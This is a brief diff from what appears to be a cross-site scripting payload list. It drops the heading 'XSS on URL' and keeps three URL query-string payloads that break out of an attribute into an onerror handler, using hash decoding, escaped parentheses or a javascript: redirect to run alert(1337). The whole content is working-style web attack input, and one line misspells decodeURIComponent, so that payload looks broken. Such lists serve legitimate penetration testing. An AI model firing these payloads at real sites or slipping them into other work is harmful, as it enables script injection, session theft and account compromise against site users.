@@ -1,5 +1,3 @@
-# XSS on URL 
-
 ?s="onerror="innerHTML=decodeURIComponet.call`${location.hash}`"#<img src onerror=alert(1337)>
 ?s="onerror="innerHTML=%27<img/scr/onerror=alert\u00281337\u0029>%27"
 ?s="onerror="location=/javascript:/.source%2Blocation"&a=%0A+alert(1337)
